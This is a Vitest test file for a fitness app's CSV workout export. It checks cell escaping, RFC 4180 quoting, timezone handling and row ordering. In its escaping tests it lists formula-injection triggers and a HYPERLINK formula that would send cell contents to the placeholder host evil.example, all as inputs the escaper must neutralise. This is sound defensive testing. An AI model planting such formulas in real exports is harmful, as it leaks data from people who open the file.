import { describe, expect, it } from 'vitest'
import { escapeCsvCell, toCsv } from '@/lib/csv'
import { buildWorkoutExportRows, EXPORT_HEADERS } from '@/lib/workoutExport'
import type { CustomActivity, CustomActivityEntry } from '@/types/customActivity'
import type { PushupEntry } from '@/types/pushupEntry'
import type { Group } from '@/types/database'

function group(): Group {
  return {
    id: 'group-1',
    name: 'The Lads',
    timezone: 'Australia/Sydney',
  } as unknown as Group
}

function pushup(overrides: Partial<PushupEntry> = {}): PushupEntry {
  return {
    id: 'entry-1',
    group_id: 'group-1',
    user_id: 'user-1',
    count: 20,
    logged_for: '2026-08-10',
    logged_at: '2026-08-10T02:30:00.000Z',
    is_backdated: false,
    review_status: 'none',
    source: 'circle_logger',
    reps_in_reserve: null,
    deleted_at: null,
    created_at: '2026-08-10T02:30:00.000Z',
    updated_at: '2026-08-10T02:30:00.000Z',
    ...overrides,
  }
}

/**
 * Undo RFC-4180 transport quoting to recover the value a spreadsheet will
 * actually put in the cell. Two protections stack — the apostrophe prefix and
 * the quoting — so asserting on the raw output would only test the outer one.
 */
function cellValueAsSeenBySpreadsheet(escaped: string): string {
  if (escaped.startsWith('"') && escaped.endsWith('"')) {
    return escaped.slice(1, -1).replaceAll('""', '"')
  }
  return escaped
}

describe('escapeCsvCell', () => {
  // A member can name a custom activity anything. Excel and Sheets execute a
  // cell beginning with =, +, - or @ as a formula, so an export opened by a
  // groupmate is a live code path if these are not neutralised.
  it.each(['=1+1', '+1', '-1', '@SUM(A1)', '\tcmd', '\rcmd'])(
    'neutralises the formula trigger %j',
    (input) => {
      expect(cellValueAsSeenBySpreadsheet(escapeCsvCell(input)).startsWith("'")).toBe(true)
    },
  )

  it('neutralises a formula that would exfiltrate data', () => {
    const attack = '=HYPERLINK("https://evil.example/?d="&A1,"click")'
    // Quoted for transport (it contains quotes and a comma) AND prefixed, so the
    // spreadsheet renders the whole thing as inert text.
    expect(cellValueAsSeenBySpreadsheet(escapeCsvCell(attack))).toBe(`'${attack}`)
  })

  it('quotes and doubles embedded quotes per RFC 4180', () => {
    expect(escapeCsvCell('say "hi"')).toBe('"say ""hi"""')
    expect(escapeCsvCell('a,b')).toBe('"a,b"')
    expect(escapeCsvCell('line\nbreak')).toBe('"line\nbreak"')
  })

  it('leaves ordinary values and emoji untouched', () => {
    expect(escapeCsvCell('Push-ups')).toBe('Push-ups')
    expect(escapeCsvCell(20)).toBe('20')
    expect(escapeCsvCell('💪 Calf raises')).toBe('💪 Calf raises')
    expect(escapeCsvCell(null)).toBe('')
  })
})

describe('toCsv', () => {
  it('emits a header row and CRLF line endings', () => {
    const csv = toCsv(['a', 'b'], [[1, 2]])
    expect(csv).toBe('a,b\r\n1,2\r\n')
  })
})

describe('buildWorkoutExportRows', () => {
  const groupsById = new Map([['group-1', group()]])

  it('emits logged_for verbatim rather than re-deriving it from the device clock', () => {
    // 02:30 UTC is already the NEXT day in Sydney. The server assigned
    // logged_for in the group timezone; re-deriving it locally would move the
    // set to a different day than every screen in the app shows.
    const rows = buildWorkoutExportRows({
      pushups: [pushup({ logged_for: '2026-08-10', logged_at: '2026-08-10T02:30:00.000Z' })],
      groupsById,
      customEntries: [],
      activitiesById: new Map(),
      profileTimezone: 'UTC',
    })

    expect(rows[0][0]).toBe('2026-08-10')
  })

  it('formats logged_at in the entry group timezone, not the profile timezone', () => {
    const rows = buildWorkoutExportRows({
      pushups: [pushup({ logged_at: '2026-08-10T02:30:00.000Z' })],
      groupsById,
      customEntries: [],
      activitiesById: new Map(),
      profileTimezone: 'UTC',
    })

    // 02:30Z is 12:30 in Australia/Sydney (UTC+10).
    expect(rows[0][5]).toBe('2026-08-10 12:30:00')
  })

  it('includes custom activities with their side, and names them from the activity', () => {
    const activity: CustomActivity = {
      id: 'act-1',
      user_id: 'user-1',
      name: 'Calf raises',
      emoji: '🦵',
      track_sides: true,
      position: 0,
      archived_at: null,
      created_at: '',
      updated_at: '',
    }
    const entry: CustomActivityEntry = {
      id: 'ce-1',
      activity_id: 'act-1',
      user_id: 'user-1',
      count: 15,
      side: 'left',
      logged_for: '2026-08-11',
      logged_at: '2026-08-11T05:00:00.000Z',
      created_at: '',
      updated_at: '',
    }

    const rows = buildWorkoutExportRows({
      pushups: [],
      groupsById,
      customEntries: [entry],
      activitiesById: new Map([['act-1', activity]]),
      profileTimezone: 'UTC',
    })

    expect(rows[0][1]).toBe('🦵 Calf raises')
    expect(rows[0][3]).toBe('left')
  })

  it('still exports entries whose activity was archived', () => {
    const archived: CustomActivity = {
      id: 'act-2',
      user_id: 'user-1',
      name: 'Dips',
      emoji: '🤸',
      track_sides: false,
      position: 1,
      archived_at: '2026-07-01T00:00:00.000Z',
      created_at: '',
      updated_at: '',
    }
    const entry: CustomActivityEntry = {
      id: 'ce-2',
      activity_id: 'act-2',
      user_id: 'user-1',
      count: 8,
      side: null,
      logged_for: '2026-06-01',
      logged_at: '2026-06-01T05:00:00.000Z',
      created_at: '',
      updated_at: '',
    }

    const rows = buildWorkoutExportRows({
      pushups: [],
      groupsById,
      customEntries: [entry],
      activitiesById: new Map([['act-2', archived]]),
      profileTimezone: 'UTC',
    })

    expect(rows).toHaveLength(1)
    expect(rows[0][1]).toBe('🤸 Dips')
  })

  it('interleaves push-ups and custom activities in date order', () => {
    const rows = buildWorkoutExportRows({
      pushups: [
        pushup({ id: 'a', logged_for: '2026-08-12', logged_at: '2026-08-12T01:00:00.000Z' }),
        pushup({ id: 'b', logged_for: '2026-08-10', logged_at: '2026-08-10T01:00:00.000Z' }),
      ],
      groupsById,
      customEntries: [
        {
          id: 'ce-3',
          activity_id: 'act-1',
          user_id: 'user-1',
          count: 5,
          side: null,
          logged_for: '2026-08-11',
          logged_at: '2026-08-11T01:00:00.000Z',
          created_at: '',
          updated_at: '',
        },
      ],
      activitiesById: new Map(),
      profileTimezone: 'UTC',
    })

    expect(rows.map((row) => row[0])).toEqual(['2026-08-10', '2026-08-11', '2026-08-12'])
  })

  it('keeps every row the same width as the header', () => {
    const rows = buildWorkoutExportRows({
      pushups: [pushup()],
      groupsById,
      customEntries: [
        {
          id: 'ce-4',
          activity_id: 'act-1',
          user_id: 'user-1',
          count: 5,
          side: 'right',
          logged_for: '2026-08-11',
          logged_at: '2026-08-11T01:00:00.000Z',
          created_at: '',
          updated_at: '',
        },
      ],
      activitiesById: new Map(),
      profileTimezone: 'UTC',
    })

    for (const row of rows) {
      expect(row).toHaveLength(EXPORT_HEADERS.length)
    }
  })
})
